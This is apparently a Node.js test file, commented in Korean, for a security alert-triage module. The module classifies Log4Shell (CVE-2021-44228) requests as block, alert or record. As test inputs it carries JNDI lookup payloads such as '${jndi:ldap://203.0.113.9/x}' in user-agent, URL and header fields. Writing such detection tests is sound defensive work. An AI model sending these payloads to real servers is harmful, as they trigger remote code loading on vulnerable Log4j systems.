import test from 'node:test';
import assert from 'node:assert/strict';
import { cp, mkdir, mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';
import { runXdr } from '../../scripts/xdr-run.mjs';
import { decide } from './decide.mjs';
import { readAlerts, summarize } from './read-alerts.mjs';

const here = dirname(fileURLToPath(import.meta.url));
const fixturePath = join(here, '..', 'fixtures', 'known-cve.json');
// 조회 구문은 경보 묶음에 있는 문서용 표기와 같은 것만 쓴다(홑따옴표 문자열이라 값이 바뀌지 않는다).
const DOC = '${jndi:ldap://203.0.113.9/x}';

const mk = (description, level, data = {}) => ({
  id: 'v', timestamp: '2026-10-01T00:00:00+09:00',
  rule: { level, description, mitre: ['T1190'] }, data: { srcip: '203.0.113.1', ...data },
});

test('decide.mjs 파일 하나만 있어도 경보 묶음이 8/8/8 로 나뉜다 (격리 환경)', async () => {
  const dir = await mkdtemp(join(tmpdir(), 'xdr-kc-'));
  try {
    await cp(join(here, 'decide.mjs'), join(dir, 'decide.mjs'));
    const iso = await import(pathToFileURL(join(dir, 'decide.mjs')).href);
    const fixture = JSON.parse(await readFile(fixturePath, 'utf8'));
    const counts = { block: 0, alert: 0, record: 0 };
    for (const alert of fixture.alerts) counts[(await iso.decide(alert)).action] += 1;
    assert.deepEqual(counts, { block: 8, alert: 8, record: 8 });
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test('decide.mjs 는 다른 파일·패키지를 불러오지 않고 파일·네트워크·프로세스를 쓰지 않는다', async () => {
  const source = await readFile(join(here, 'decide.mjs'), 'utf8');
  const code = source.split('\n').filter((line) => !line.trim().startsWith('//')).join('\n');
  assert.ok(!/^\s*import\s/mu.test(code), 'import 문 없음');
  assert.ok(!/\bimport\s*\(|\brequire\s*\(|\bfetch\s*\(|\bprocess\b|\beval\s*\(|new Function|node:|readFile|writeFile|XMLHttpRequest|WebSocket/u.test(code));
  const mod = await import('./decide.mjs');
  assert.deepEqual(Object.keys(mod), ['decide']);
});

test('PATTERNS 상수는 patterns.json 과 같고, 패턴마다 이름·조건·근거 한 줄이 있다', async () => {
  const source = await readFile(join(here, 'decide.mjs'), 'utf8');
  const literal = source.slice(source.indexOf('const PATTERNS = ') + 'const PATTERNS = '.length, source.indexOf('];\n') + 1);
  const embedded = JSON.parse(literal);
  const file = JSON.parse(await readFile(join(here, 'patterns.json'), 'utf8'));
  assert.deepEqual(embedded, file.patterns);
  assert.equal(file.technique, 'T1190');
  for (const pattern of file.patterns) {
    assert.ok(pattern.name && pattern.when && typeof pattern.evidence === 'string' && pattern.evidence.length > 10 && !pattern.evidence.includes('\n'), pattern.id);
    assert.ok(pattern.confidence >= 0 && pattern.confidence <= 1, pattern.id);
  }
});

test('조회 구문이 어느 필드·방식·대소문자로 와도 명확한 공격은 block 이다', () => {
  const cases = [
    mk('경보', 4, { useragent: DOC }),
    mk('경보', 4, { url: `/search?q=${DOC}` }),
    mk('경보', 3, { headers: { 'User-Agent': DOC } }),
    mk('경보', 3, { referer: DOC }),
    mk('경보', 3, { url: '/x?q=${JNDI:RMI://203.0.113.9/x}' }),
    mk('경보', 3, { url: '/x?q=${jndi:dns://203.0.113.9/x}' }),
    mk('경보', 3, {}),
  ];
  cases[cases.length - 1].full_log = `GET /x ${DOC}`;
  for (const alert of cases) assert.equal(decide(alert).action, 'block', JSON.stringify(alert.data));
  assert.equal(decide(mk('알 수 없는 문구', 12, {})).action, 'block');
  assert.equal(decide(mk('CVE-2021-44228 형태 요청입니다.', 4, {})).action, 'block');
  assert.equal(decide(mk('경보', 4, { useragent: DOC, url: `/x?q=${DOC}` })).confidence, 0.99);
});

test('단어만 있거나 위험도가 애매하면 alert 이고, 정상 이벤트는 record 이다', () => {
  assert.equal(decide(mk('검색어에 CVE-2021-44228 이라는 글자만 있습니다.', 6, { url: '/search?q=CVE-2021-44228' })).action, 'alert');
  assert.equal(decide(mk('수업 노트에 단어가 있습니다.', 3, { url: '/notes?q=jndi-class-note' })).action, 'alert');
  assert.equal(decide(mk('요청 형태가 비슷합니다.', 7, { url: '/search?q=lookup-fragment' })).action, 'alert');
  assert.equal(decide(mk('점검 도구 이름이 있습니다.', 3, { url: '/x?probe=1' })).action, 'alert');
  for (const level of [0, 1, 2, 3, 4]) {
    const out = decide(mk('로그인이 성공했습니다.', level, { url: '/login', srcuser: 'user01' }));
    assert.equal(out.action, 'record');
    assert.ok(out.confidence < 0.5);
  }
});

test('필드가 빠지거나 모양이 틀린 경보도 오류 없이 record 이다', () => {
  for (const bad of [undefined, null, 'x', 5, [], {}, { rule: null, data: 5 }, { rule: { level: 'abc' }, data: null }, { data: { a: { b: { c: { d: DOC } } } } }]) {
    const out = decide(bad);
    assert.equal(out.action, 'record', JSON.stringify(bad));
  }
});

test('반환은 action·confidence·reason 세 값만이고, 이유에는 요청의 값을 담지 않는다', async () => {
  const fixture = JSON.parse(await readFile(fixturePath, 'utf8'));
  for (const alert of fixture.alerts) {
    const out = decide(alert);
    assert.deepEqual(Object.keys(out).sort(), ['action', 'confidence', 'reason']);
    assert.ok(['block', 'alert', 'record'].includes(out.action));
    assert.ok(out.confidence >= 0 && out.confidence <= 1);
    assert.ok(typeof out.reason === 'string' && out.reason.length > 0 && !out.reason.includes('\n'));
    assert.ok(!/\$\{|ldap|203\.0\.113|198\.51\.100|192\.0\.2/u.test(out.reason));
    assert.equal(decide(alert).action, out.action); // 같은 입력이면 같은 답
  }
});

test('입력 경보를 바꾸지 않는다', async () => {
  const alert = mk('CVE-2021-44228 형태 요청입니다.', 12, { useragent: DOC });
  const copy = JSON.stringify(alert);
  decide(alert);
  assert.equal(JSON.stringify(alert), copy);
});

test('읽기 모듈은 24건에서 24줄을 뽑고 요청 주소·머리글·조회 구문은 뽑지 않는다', async () => {
  const rows = await readAlerts();
  const fixture = JSON.parse(await readFile(fixturePath, 'utf8'));
  assert.equal(rows.length, fixture.alerts.length);
  assert.deepEqual(Object.keys(rows[0]).sort(), ['count', 'description', 'id', 'level', 'mitre', 'srcip', 'time', 'user']);
  assert.ok(!JSON.stringify(rows).includes('${'));
  assert.ok(!JSON.stringify(summarize(mk('x', 5, { useragent: DOC, url: DOC }))).includes('jndi'));
  assert.equal(summarize(null).level, 0);
  const source = await readFile(join(here, 'read-alerts.mjs'), 'utf8');
  assert.ok(!/from '\.\/decide\.mjs'/u.test(source), '읽기 모듈은 판정 모듈을 부르지 않는다');
});

test('실행기가 결과 파일을 만들고 건수가 나온다', async () => {
  const dir = await mkdtemp(join(tmpdir(), 'xdr-run-kc-'));
  try {
    await mkdir(join(dir, 'xdr', 'fixtures'), { recursive: true });
    await mkdir(join(dir, 'xdr', 'known-cve'), { recursive: true });
    await cp(fixturePath, join(dir, 'xdr', 'fixtures', 'known-cve.json'));
    await cp(join(here, 'decide.mjs'), join(dir, 'xdr', 'known-cve', 'decide.mjs'));
    const errors = [];
    const result = await runXdr({ root: dir, moduleKey: 'known-cve', writeError: (line) => errors.push(line) });
    assert.deepEqual(result.counts, { block: 8, alert: 8, record: 8 });
    assert.deepEqual(errors, []);
    const written = JSON.parse(await readFile(join(dir, 'xdr', 'known-cve', 'result.json'), 'utf8'));
    assert.equal(written.schema, 'aleph.xdr.result.v1');
    assert.equal(written.decisions.length, 24);
    await writeFile(join(dir, 'unused'), '');
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});
